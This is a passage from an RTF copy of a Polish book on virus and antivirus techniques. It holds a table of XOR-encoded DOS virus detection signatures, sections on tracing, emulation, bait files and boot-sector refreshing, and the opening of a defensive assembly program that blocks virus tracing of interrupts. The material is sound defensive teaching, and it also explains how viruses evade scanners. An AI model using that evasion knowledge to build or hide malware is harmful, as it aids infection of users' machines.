\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV ES:[1],0008h                     ',7,026h xor 0AAh,0C7h,006h,001h,000h,008h,000h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV DS:[100h],????                   ',4,0C7h xor 0AAh,006h,000h,001h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV ES:[100h],????                   ',5,026h xor 0AAh,0C7h,006h,000h,001h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX, 100h; PUSH AX; RET           ',5,0B8h xor 0AAh,000h,001h,050h,0C3h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV CX, 100h; PUSH CX; RET           ',5,0B9h xor 0AAh,000h,001h,051h,0C3h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV DX, 100h; PUSH DX; RET           ',5,0BAh xor 0AAh,000h,001h,052h,0C3h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV BX, 100h; PUSH BX; RET           ',5,0BBh xor 0AAh,000h,001h,053h,0C3h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX, 100h; JMP AX                 ',5,0B8h xor 0AAh,000h,001h,0FEh,0E0h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV CX, 100h; JMP CX                 ',5,0B9h xor 0AAh,000h,001h,0FEh,0E1h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV DX, 100h; JMP DX                 ',5,0BAh xor 0AAh,000h,001h,0FEh,0E2h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV BX, 100h; JMP BX                 ',5,0BBh xor 0AAh,000h,001h,0FEh,0E3h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV DS:[0086],CS                     ',4,08Ch xor 0AAh,00Eh,086h,000h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV ES:[0086],CS                     ',5,026h xor 0AAh,08Ch,00Eh,086h,000h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,DS; DEC AX; MOV DS,AX         ',5,08Ch xor 0AAh,0D8h,048h,08Eh,0D8h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AX,ES; DEC AX; MOV ES,AX         ',5,08Ch xor 0AAh,0C0h,048h,08Eh,0C0h>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Sygn <'MOV AL,3; IRET                       ',3,0B4h xor 0AAh,003h,0CFh>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IleSygnatur = ($-offset Sygnatury)/DlugoscSygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  AdresMCB         dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  IloscBiezSygn    dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  IloscSygn        dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Koniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HEUR ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.3. Tryb krokowy}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do wykrywania zaawansowanych polimorficznych wirus\'f3w nie mo\uc1\u380\'bfna stosowa\uc1\u263\'e6 zwyk\uc1\u322\'b3ego skaningu, gdy\uc1\u380\'bf kod wirusa za ka\uc1\u380\'bfdym razem wygl\uc1\u261\'b9da zupe\uc1\u322\'b3nie inaczej. Mo\uc1\u380\'bfliwym wyj\uc1\u347\'9cciem jest w tej sytuacji wykorzystanie trybu krokowego procesora. Program antywirusowy uruchamia sprawdzany program w trybie krokowym pod kontrol\uc1\u261\'b9 odpowiedniego monitora tego przerwania przy u\uc1\u380\'bfyciu np. (4B01/21). Po ka\uc1\u380\'bfdej wykonanej instrukcji wywo\uc1\u322\'b3ywany jest monitor, kt\'f3ry spra}{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}dza, czy np. aktualnie wykonywana instrukcja pasuje do listy chararakterystycznych, sta\uc1\u322\'b3ych instrukcji wirusa (jego wersji odszyfrowanej). Je\uc1\u380\'bfeli instrukcja spe\uc1\u322\'b3nia wymagania, monitor - przy u\uc1\u380\'bfyciu dozwolonego w tym przypadku skaningu - sprawdza, czy w ko}{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}zie jest ju\uc1\u380\'bf odszyfrowany wirus. Je\uc1\u380\'bfeli po przekroczeniu jakiej\uc1\u347\'9c warto\uc1\u347\'9cci granicznej wykonanych instrukcji monitor nie wykryje \uc1\u380\'bfadnego podejrzanego kodu, sztucznie ko\uc1\u324\'f1czy program i sygnalizuje, i\uc1\u380\'bf nie ma w nim wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.4. Emulacja procesora}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf om\'f3wiony w poprzednim punkcie tryb krokowy mo\uc1\u380\'bfna oszuka\uc1\u263\'e6, autorzy program\'f3w AV musieli zastosowa\uc1\u263\'e6 inn\uc1\u261\'b9 metod\uc1\u281\'ea kontrolowanego uruchamiania program\'f3w. W tym celu wbudowali w swe programy interpretator asemblera, dzi\uc1\u281\'eaki kt\'f3remu mog\uc1\u261\'b9 emulowa\uc1\u263\'e6 wykonyw}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}nie pocz\uc1\u261\'b9tkowych intrukcji programu, maj\uc1\u261\'b9c jednocze\uc1\u347\'9cnie nad nim pe\uc1\u322\'b3n\uc1\u261\'b9 kontrol\uc1\u281\'ea. Ze wzgl\uc1\u281\'eadu na ci\uc1\u261\'b9g\uc1\u322\'b3y rozw\'f3j procesor\'f3w linii 80x86 interpretator asemblera musi by\uc1\u263\'e6 stale rozwijany. Nieuwzgl\uc1\u281\'eadnienie instrukcji wszystkich procesor\'f3w spowoduje bowiem, i\uc1\u380\'bf prz}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0} najbli\uc1\u380\'bfszym wyst\uc1\u261\'b9pieniu instrukcji, kt\'f3rej monitor jeszcze nie potrafi rozpozna\uc1\u263\'e6, jego dzia\uc1\u322\'b3anie zostanie zako\uc1\u324\'f1czone z wynikiem negatywnym. Do niedawna sprawa mia\uc1\u322\'b3a si\uc1\u281\'ea tak na przyk\uc1\u322\'b3ad z kodami 66h, 67h, b\uc1\u281\'ead\uc1\u261\'b9cymi interfejsem rozszerzoych instrukcji dla p}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}ocesor\'f3w 386 i wy\uc1\u380\'bfszych. Niekt\'f3re wirusy celowo wykorzystywa\uc1\u322\'b3y je do oszukiwania program\'f3w antywirusowych, kt\'f3re po ich napotkaniu ko\uc1\u324\'f1czy\uc1\u322\'b3y sprawdzanie pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.5. Przyn\uc1\u281\'eaty (ang. baits, decoys)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jedn\uc1\u261\'b9 z technik u\uc1\u380\'bfywanych do \uc1\u322\'b3apania prostych wirus\'f3w s\uc1\u261\'b9 przyn\uc1\u281\'eaty. S\uc1\u261\'b9 to programy, daj\uc1\u261\'b9ce si\uc1\u281\'ea zainfekowa\uc1\u263\'e6 ewentualnemu wirusowi. Najcz\uc1\u281\'ea\uc1\u347\'9cciej na kod takiego programu sk\uc1\u322\'b3ada si\uc1\u281\'ea kilkaset lub kilka tysi\uc1\u281\'eacy razy powt\'f3rzona operacja NOP oraz instrukcja zako\uc1\u324\'f1czenia programu. Program antywirusowy mo\uc1\u380\'bfe tworzy\uc1\u263\'e6 kilka lub w}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}\uc1\u281\'eacej takich plik\'f3w i nast\uc1\u281\'eapnie wykonywa\uc1\u263\'e6 z nimi r\'f3\uc1\u380\'bfne operacje: uruchamia\uc1\u263\'e6, otwiera\uc1\u263\'e6, czyta\uc1\u263\'e6 i zapisywa\uc1\u263\'e6 do nich na r\'f3\uc1\u380\'bfne sposoby, aby da\uc1\u263\'e6 szans\uc1\u281\'ea ewentualnemu wirusowi na ich zainfekowanie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wygenerowana przyn\uc1\u281\'eata powinna jak najbardziej przypomina\uc1\u263\'e6 typowy program, i to zar\'f3wno pod wzgl\uc1\u281\'eadem d\uc1\u322\'b3ugo\uc1\u347\'9cci, jak i zawarto\uc1\u347\'9cci. Je\uc1\u380\'bfeli bowiem d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku jest znacz\uc1\u261\'b9ca, tzn. np. wynosi jak\uc1\u261\'b9\uc1\u347\'9c wielokrotno\uc1\u347\'9c\uc1\u263\'e6 liczb 10 czy 16, wirus mo\uc1\u380\'bfe nie zainfekowa\uc1\u263\'e6 takiego pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.6. Od\uc1\u347\'9cwie\uc1\u380\'bfanie program\'f3w systemowych w sekt}{\f1\fs24\b\lang1045{\*\listtag0}orach}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ta do\uc1\u347\'9c\uc1\u263\'e6 trywialna technika s\uc1\u322\'b3u\uc1\u380\'bfy do nadpisywania program\'f3w istniej\uc1\u261\'b9cych w BOOT-sektorach lub G\uc1\u322\'b3\'f3wnych Rekordach \uc1\u321\'a3aduj\uc1\u261\'b9cych. Jednym z efekt\'f3w wykonania takiego od\uc1\u347\'9cwie\uc1\u380\'bfania mo\uc1\u380\'bfe by\uc1\u263\'e6 usuni\uc1\u281\'eacie nieznanego jeszcze wirusa z zajmowanego przez niego sektora. Podczas przeprowadzania operacji od\uc1\u347\'9cwie\uc1\u380\'bfania nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf niekt\'f3re wirusy ca\uc1\u322\'b3kowicie przejmuj\uc1\u261\'b9 kontrol\uc1\u281\'ea nad danymi zawartymi w sektorach systemowych, tak wi\uc1\u281\'eac zamazanie wirusa mo\uc1\u380\'bfe spowodowa\uc1\u263\'e6, i\uc1\u380\'bf podczas nast\uc1\u281\'eapnego startu systemu system nie b\uc1\u281\'eadzie}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}si\uc1\u281\'ea \uc1\u322\'b3adowa\uc1\u322\'b3 z twardego dysku lub te\uc1\u380\'bf - co gorsza - nie b\uc1\u281\'eadzie mo\uc1\u380\'bfna odczyta\uc1\u263\'e6 zapisanych na dysku danych.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Mo\uc1\u380\'bfliwe wyj\uc1\u347\'9ccie z tej sytuacji polega na zapisaniu aktualnego stanu dysku (zawarto\uc1\u347\'9cci sektor\'f3w) w kopii bezpiecze\uc1\u324\'f1stwa np. na czystej dyskietce, aby mo\uc1\u380\'bfna by\uc1\u322\'b3o p\'f3\uc1\u378\'9fniej odtworzy\uc1\u263\'e6 operacj\uc1\u281\'ea od\uc1\u347\'9cwie\uc1\u380\'bfania. Ze wzgl\uc1\u281\'eadu na mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 stosowania przez wirusa techniki stealth odczyty najlepiej, by\uc1\u322\'b3oby wykonywa\uc1\u263\'e6 przez porty.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.7. Blokowanie program\'f3w u\uc1\u380\'bfywaj\uc1\u261\'b9cych trybu krokowego}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Niekt\'f3re monitory antywirusowe posiad}{\f0\fs24\lang1045{\*\listtag0}aj\uc1\u261\'b9 wbudowane mechanizmy blokowania wirus\'f3w, kt\'f3re u\uc1\u380\'bfywaj\uc1\u261\'b9 trybu krokowego do znalezienia oryginalnych wej\uc1\u347\'9c\uc1\u263\'e6 do przerwa\uc1\u324\'f1.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zainstalowany monitor przejmuje najbardziej nara\uc1\u380\'bfone na tracing przerwania (13h, 21h, 2Fh) i podczas ich wywo\uc1\u322\'b3ywania ustawia procedur\uc1\u281\'ea obs\uc1\u322\'b3ugi przerwania INT 0lh (trybu krokowego) na pust\uc1\u261\'b9 procedur\uc1\u281\'ea, zako\uc1\u324\'f1czon\uc1\u261\'b9 rozkazem IRET, a po wywo\uc1\u322\'b3aniu oryginalnej procedury chronionego przez siebie przerwania przywraca star\uc1\u261\'b9 procedur\uc1\u281\'ea przerwania l. Dzi\uc1\u281\'eaki temu wirus pr\'f3buj\uc1\u261\'b9cy znale\uc1\u378\'9f\uc1\u263\'e6 oryginaln\uc1\u261\'b9 pro}{\f1\fs24\lang1045{\*\listtag0}c}{\f0\fs24\lang1045{\*\listtag0}edur\uc1\u281\'ea przerwania znajdzie adres b\uc1\u281\'ead\uc1\u261\'b9cy cz\uc1\u281\'ea\uc1\u347\'9cci\uc1\u261\'b9 monitora antywirusowego. W efekcie wszystkie wykonywane przez wirusa czynno\uc1\u347\'9cci b\uc1\u281\'ead\uc1\u261\'b9 przechodzi\uc1\u263\'e6 przez monitor, kt\'f3ry nie pozwoli na niebezpieczne dzia\uc1\u322\'b3ania.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfsz\uc1\u261\'b9 technik\uc1\u281\'ea demonstruje poni\uc1\u380\'bfszy program.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                       ANTYTRAC v1.0, Autor : Adam Blaszczyk 1997           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Program nie pozwala przejsc w trybie krokowym                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              przez przerwania 13h i 21h.                                   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              W efekcie wirusy uzywajace tracingu do odnalezienia           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              oryginalnych procedur obslugi tych przerwan nie znajda        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              ostatniego elementu lancucha, a tylko element posredni.       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     ANTYTRAC.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t ANTYTRAC.OBJ                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NUL = 00h                                 ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LF  = 0Ah                                 ;  - stale potrzebne do deklaracji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CR  = 0Dh                                 ; /  lancuchow napisowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ANTYTRAC SEGMENT                          ; segment kodu i danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ORG 100h                                  ; program jest typu COM}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASSUME CS:ANTYTRAC, DS:ANTYTRAC, ES:ANTYTRAC, SS:ANTYTRAC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugoscKoduTSR      = (offset KoniecKoduTSR-offset PoczatekKoduTSR+15)/16+10h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; oblicza, ile pamieci zajmie TSR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PoczatekKoduTSR:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:                                    ; tu zaczyna sie program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      jmp   Poczatek                       ; skocz i zainstaluj lub odinstaluj program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt21h:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      cmp   ax,3521h                       ; czy to funkcja 3521h ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      jne   Nie3521                        ; NIE - skocz na koniec obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      cmp   bp,0BACAh                      ; czy to ponownie uruchomiony program ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; wywolal te funkcje ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      jne   Nie3521                        ; NIE - skocz na koniec obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; TAK - odinstaluj wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  es ds                          ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lds   dx,dword ptr cs:[StareInt21]   ; pobierz stary adres INT 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,2521h                       ; funkcja DOS - ustaw nowe przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje (rekurencyjnie)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lds   dx,dword ptr cs:[StareInt13]   ; pobierz stary adres INT 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
